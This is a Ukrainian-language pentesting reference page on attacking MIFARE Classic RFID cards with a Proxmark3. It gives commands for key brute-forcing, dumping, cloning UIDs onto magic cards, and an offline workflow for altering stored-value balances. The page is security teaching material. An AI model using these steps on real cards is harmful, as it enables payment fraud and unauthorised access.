# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Атака на RFID-системи за допомогою Proxmark3

Перше, що вам потрібно зробити, — це мати [**Proxmark3**](https://proxmark.com) і [**встановити програмне забезпечення та його залежност**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**і**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Атака на MIFARE Classic 1KB

Він має **16 секторів**, кожен із них має **4 блоки**, а кожен блок містить **16B**. UID знаходиться в секторі 0, блоці 0 (і не може бути змінений).\
Для доступу до кожного сектора потрібні **2 ключі** (**A** і **B**), які зберігаються в **блоці 3 кожного сектора** (трейлер сектора). Трейлер сектора також зберігає **біти доступу**, які визначають дозволи на **читання та запис** для **кожного блоку** за допомогою 2 ключів.\
2 ключі корисні для надання дозволів на читання, якщо ви знаєте перший, і на запис, якщо ви знаєте другий (наприклад).

Можна виконати кілька атак<sup>[[1]](#references)</sup>.
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Proxmark3 дозволяє виконувати інші дії, наприклад **перехоплювати** **комунікацію між Tag і Reader**, щоб спробувати знайти чутливі дані. У цій картці можна просто прослухати комунікацію та обчислити використаний ключ, оскільки **використані криптографічні операції є слабкими**, а знаючи відкритий і шифротекст, його можна обчислити (інструмент `mfkey64`).<sup>[[3]](#references)</sup>

#### Швидкий workflow MiFare Classic для зловживання збереженою вартістю

Коли термінали зберігають баланси на картах Classic, типовий end-to-end процес має такий вигляд:<sup>[[4]](#references)</sup>
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
Нотатки

- `hf mf autopwn` orchestrates nested/darkside/HardNested-style attacks, recovers keys і створює dumps у папці client dumps.
- Запис блоку 0/UID працює лише на magic-картах gen1a/gen2. Звичайні Classic-карти мають UID лише для читання.<sup>[[2]](#references)</sup>
- У багатьох розгортаннях використовуються Classic "value blocks" або прості контрольні суми. Після редагування переконайтеся, що всі дубльовані/інвертовані поля та контрольні суми узгоджені.

Опис методології вищого рівня та способів захисту наведено в:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Сирі команди

IoT-системи іноді використовують **небрендовані або некомерційні теги**. У такому разі можна використовувати Proxmark3 для надсилання **сирих команд до тегів**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Маючи цю інформацію, ви можете спробувати знайти відомості про картку та спосіб взаємодії з нею. Proxmark3 дозволяє надсилати raw commands, наприклад: `hf 14a raw -p -b 7 26`

### Scripts

ПЗ Proxmark3 містить попередньо завантажений список **automation scripts**, які можна використовувати для виконання простих завдань. Щоб отримати повний список, використайте команду `script list`. Потім використайте команду `script run`, вказавши назву script:
```
proxmark3> script run mfkeys
```
Ви можете створити скрипт для **fuzz зчитувачів тегів**: скопіювавши дані **дійсної картки**, просто напишіть **Lua script**, який **рандомізує** один або кілька випадкових **байтів**, і перевіряйте, чи **завершує роботу зчитувач** під час будь-якої ітерації.

## References

- [1] [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [Заява NXP щодо MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [Експлуатація вразливості NFC-карток у KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)

{{#include ../../banners/hacktricks-training.md}}
